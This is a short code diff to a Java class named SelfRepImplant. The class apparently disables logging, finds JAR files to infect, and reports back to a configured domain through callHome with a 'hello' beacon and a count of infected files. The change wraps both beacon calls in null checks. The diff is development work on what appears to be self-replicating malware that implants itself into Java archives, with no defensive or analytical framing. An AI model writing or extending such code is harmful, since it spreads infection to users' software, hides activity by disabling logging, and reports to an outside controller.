@@ -89,7 +89,9 @@ public class SelfRepImplant implements Runnable, Thread.UncaughtExceptionHandler
         disableAllLogging();
 
         String id = generateRandomId();
-        callHome(CONF_DOMAIN, "hello", id);
+        if (CONF_DOMAIN != null) {
+            callHome(CONF_DOMAIN, "hello", id);
+        }
 
         Set<Path> jarsToImplant;
         try {
@@ -150,7 +152,9 @@ public class SelfRepImplant implements Runnable, Thread.UncaughtExceptionHandler
             }
         }
 
-        callHome(CONF_DOMAIN, "did-" + numInfected, id);
+        if (CONF_DOMAIN != null) {
+            callHome(CONF_DOMAIN, "did-" + numInfected, id);
+        }
     }
 
     public static Set<Path> findAllJars(String root, String ignoreSpec) throws IllegalArgumentException {
